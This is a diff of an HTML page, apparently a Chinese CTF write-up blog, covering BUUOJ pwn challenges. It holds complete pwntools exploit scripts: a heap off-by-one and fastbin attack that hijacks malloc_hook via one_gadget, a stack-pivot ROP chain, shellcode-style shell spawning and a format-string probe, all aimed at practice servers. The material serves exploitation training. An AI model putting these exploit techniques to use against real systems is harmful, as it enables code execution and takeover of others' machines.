 </span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">int_0x80</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h3 id="解法四orw" class="heading-element">
-  <a href="#%e8%a7%a3%e6%b3%95%e5%9b%9borw" class="heading-mark"></a>解法四：orw</h3><div class="highlight" id="id-7"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h3 id="解法四orw" class="heading-element"><span>解法四：orw</span>
+  <a href="#%e8%a7%a3%e6%b3%95%e5%9b%9borw" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./rop&#39;</span><span class="p">)</span> 
 </span></span><span class="line"><span class="cl"><span class="c1">##p = remote(&#39;node3.buuoj.cn&#39;,26508)</span>
 </span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./rop&#39;</span><span class="p">)</span>
@@ -313,8 +330,11 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;./flag&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x32roarctf_2019_easy_pwn" class="heading-element">
-  <a href="#0x32roarctf_2019_easy_pwn" class="heading-mark"></a>0x32.roarctf_2019_easy_pwn</h2><div class="highlight" id="id-8"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gwt@ubuntu:~/Desktop$ checksec roarctf_2019_easy_pwn 
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x32roarctf_2019_easy_pwn" class="heading-element"><span>0x32.roarctf_2019_easy_pwn</span>
+  <a href="#0x32roarctf_2019_easy_pwn" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gwt@ubuntu:~/Desktop$ checksec roarctf_2019_easy_pwn 
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/gwt/Desktop/roarctf_2019_easy_pwn&#39;</span>
 </span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
 </span></span><span class="line"><span class="cl">    RELRO:    Full RELRO
@@ -323,7 +343,7 @@
 </span></span><span class="line"><span class="cl">    PIE:      PIE enabled</span></span></code></pre></div><p>保护全开</p>
 <p>分为create，write，drop和show</p>
 <p>create:</p>
-<div class="highlight" id="id-9"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="nf">sub_C46</span><span class="p">()</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="nf">sub_C46</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">index</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-1Ch]
@@ -356,7 +376,7 @@
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>write:</p>
-<div class="highlight" id="id-10"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="nf">sub_E82</span><span class="p">()</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="nf">sub_E82</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h]
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h]
@@ -383,7 +403,7 @@
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v2</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>其中：</p>
-<div class="highlight" id="id-11"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_E26</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_E26</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
@@ -396,7 +416,7 @@
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>有off-by-one，当输入的size与原来的相差是10的时候，会加1。</p>
 <p>delete：没有什么问题。</p>
-<div class="highlight" id="id-12"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="nf">sub_F8E</span><span class="p">()</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="nf">sub_F8E</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// eax
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h]
@@ -420,11 +440,11 @@
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v4</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>首先calloc几个chunk</p>
-<div class="highlight" id="id-13"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1">#0,,这里calloc 0x58方便后面的写入</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1">#0,,这里calloc 0x58方便后面的写入</span>
 </span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span> <span class="c1">#1</span>
 </span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span> <span class="c1">#2</span>
 </span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span> <span class="c1">#3</span>
-</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span> <span class="c1">#4</span></span></span></code></pre></div><div class="highlight" id="id-14"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; x/60gx 0x555555757000
+</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span> <span class="c1">#4</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; x/60gx 0x555555757000
 </span></span><span class="line"><span class="cl">0x555555757000:	0x0000000000000000	0x0000000000000061
 </span></span><span class="line"><span class="cl">0x555555757010:	0x0000000000000000	0x0000000000000000
 </span></span><span class="line"><span class="cl">0x555555757020:	0x0000000000000000	0x0000000000000000
@@ -456,7 +476,7 @@
 </span></span><span class="line"><span class="cl">0x5555557571c0:	0x0000000000000000	0x0000000000000000
 </span></span><span class="line"><span class="cl">0x5555557571d0:	0x0000000000000000	0x0000000000000000</span></span></code></pre></div><p>之后：</p>
 <p><code>write(0, 0x58 + 0xa, 'a'* 0x58 + '\xe1')</code></p>
-<div class="highlight" id="id-15"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; x/60gx 0x555555757000
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwndbg&gt; x/60gx 0x555555757000
 </span></span><span class="line"><span class="cl">0x555555757000:	0x0000000000000000	0x0000000000000061
 </span></span><span class="line"><span class="cl">0x555555757010:	0x6161616161616161	0x6161616161616161
 </span></span><span class="line"><span class="cl">0x555555757020:	0x6161616161616161	0x6161616161616161
@@ -487,7 +507,7 @@
 </span></span><span class="line"><span class="cl">0x5555557571b0:	0x0000000000000000	0x0000000000000071
 </span></span><span class="line"><span class="cl">0x5555557571c0:	0x0000000000000000	0x0000000000000000
 </span></span><span class="line"><span class="cl">0x5555557571d0:	0x0000000000000000	0x0000000000000000</span></span></code></pre></div><p>然后drop掉idx1，这样的话idx1和2都会进入bin中。</p>
-<div class="highlight" id="id-16"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">drop</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">drop</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span> <span class="c1">#1</span>
 </span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1">#2 is unsortbin</span>
 </span></span><span class="line"><span class="cl"><span class="c1">##这样会把fd和bk指针打出来</span>
@@ -496,22 +516,22 @@
 </span></span><span class="line"><span class="cl"><span class="n">main_arean</span> <span class="o">=</span> <span class="n">address</span> <span class="o">-</span> <span class="mh">0x58</span>
 </span></span><span class="line"><span class="cl"><span class="n">one_gadget</span> <span class="o">=</span> <span class="mh">0x4526a</span>
 </span></span><span class="line"><span class="cl"><span class="n">fake_chunk</span> <span class="o">=</span> <span class="n">main_arean</span> <span class="o">-</span> <span class="mh">0x33</span></span></span></code></pre></div><p>show的地址是 unsorted bin 链表的头部，跟 main_arena 的偏移固定 0x58，同时 main_arena 跟 libc 的偏移可以通过工具计算出来 <a href="https://github.com/bash-c/main_arena_offset"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/bash-c/main_arena_offset</a></p>
-<div class="highlight" id="id-17"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gwt@ubuntu:~/main_arena_offset$ ./main_arena ../Desktop/libc-2.23.so 
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gwt@ubuntu:~/main_arena_offset$ ./main_arena ../Desktop/libc-2.23.so 
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span>libc version : glibc 2.23
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span>build ID : BuildID<span class="o">[</span>sha1<span class="o">]=</span>9a6b57c7a4f93d7e54e61bccb7df996c8bc58141
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span>main_arena_offset : 0x1b0780
 </span></span><span class="line"><span class="cl">gwt@ubuntu:~/main_arena_offset$ ./main_arena /lib/x86_64-linux-gnu/libc.so.6
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span>libc version : glibc 2.23
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span>build ID : BuildID<span class="o">[</span>sha1<span class="o">]=</span>30773be8cf5bfed9d910c8473dd44eaab2e705ab
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span>main_arena_offset : 0x3c4b20</span></span></code></pre></div><div class="highlight" id="id-18"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span> <span class="c1">#5 (on 2&#39;s address)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span>main_arena_offset : 0x3c4b20</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span> <span class="c1">#5 (on 2&#39;s address)</span>
 </span></span><span class="line"><span class="cl"><span class="n">drop</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">write</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span> <span class="c1">#5 (2)</span>
 </span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span> <span class="c1">#6 fake chunk</span>
 </span></span><span class="line"><span class="cl"><span class="n">realloc_addr</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__libc_realloc&#39;</span><span class="p">]</span></span></span></code></pre></div><p>malloc_hook 劫持为 realloc ，realloc_hook 劫持为 onegadget ：</p>
-<div class="highlight" id="id-19"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">11</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span> <span class="o">+</span> <span class="n">libc_base</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">realloc_addr</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">11</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span> <span class="o">+</span> <span class="n">libc_base</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">realloc_addr</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">write</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span></span></span></code></pre></div><p>exp：</p>
-<div class="highlight" id="id-20"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">##coding:utf-8</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">##coding:utf-8</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="c1">##p = process(&#39;./roarctf_2019_easy_pwn&#39;)</span>
 </span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node4.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">25955</span><span class="p">)</span>
@@ -563,8 +583,11 @@
 </span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">11</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span> <span class="o">+</span> <span class="n">libc_base</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">realloc_addr</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">write</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x33gyctf_2020_borrowstack" class="heading-element">
-  <a href="#0x33gyctf_2020_borrowstack" class="heading-mark"></a>0x33.gyctf_2020_borrowstack</h2><div class="highlight" id="id-21"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">int</span> <span class="n">__cdecl</span> <span class="n">main</span><span class="p">(</span><span class="nb">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="n">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x33gyctf_2020_borrowstack" class="heading-element"><span>0x33.gyctf_2020_borrowstack</span>
+  <a href="#0x33gyctf_2020_borrowstack" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">int</span> <span class="n">__cdecl</span> <span class="n">main</span><span class="p">(</span><span class="nb">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="n">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="n">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">96</span><span class="p">];</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">0</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">60</span><span class="n">h</span><span class="p">]</span> <span class="n">BYREF</span>
 </span></span><span class="line"><span class="cl">
@@ -579,7 +602,7 @@
 <p>第一次read 的大小恰好可以覆写ret地址。</p>
 <p>迁移栈到bss段，然后第二个read写rop，在之后执行onegadget。</p>
 <p>exp：</p>
-<div class="highlight" id="id-22"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="c1">##io = process(&#34;./gyctf_2020_borrowstack&#34;)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">29529</span><span class="p">)</span>
@@ -605,8 +628,11 @@
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="mh">0x68</span><span class="o">*</span><span class="s1">&#39;A&#39;</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">one_gadget</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x34axb_2019_fmt32" class="heading-element">
-  <a href="#0x34axb_2019_fmt32" class="heading-mark"></a>0x34.axb_2019_fmt32</h2><div class="highlight" id="id-23"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x34axb_2019_fmt32" class="heading-element"><span>0x34.axb_2019_fmt32</span>
+  <a href="#0x34axb_2019_fmt32" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">257</span><span class="p">];</span> <span class="c1">// [esp+Fh] [ebp-239h] BYREF
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">format</span><span class="p">[</span><span class="mi">300</span><span class="p">];</span> <span class="c1">// [esp+110h] [ebp-138h] BYREF
@@ -634,13 +660,13 @@
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
 </span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;what you input is really long!&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="highlight" id="id-24"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gwt@ubuntu:~/Desktop$ ./axb_2019_fmt32 
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gwt@ubuntu:~/Desktop$ ./axb_2019_fmt32 
 </span></span><span class="line"><span class="cl">Hello,I am a computer Repeater updated.
 </span></span><span class="line"><span class="cl">After a lot of machine learning,I know that the essence of man is a reread machine!
 </span></span><span class="line"><span class="cl">So I<span class="err">&#39;</span>ll answer whatever you say!
 </span></span><span class="line"><span class="cl">Please tell me:aaaaa%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
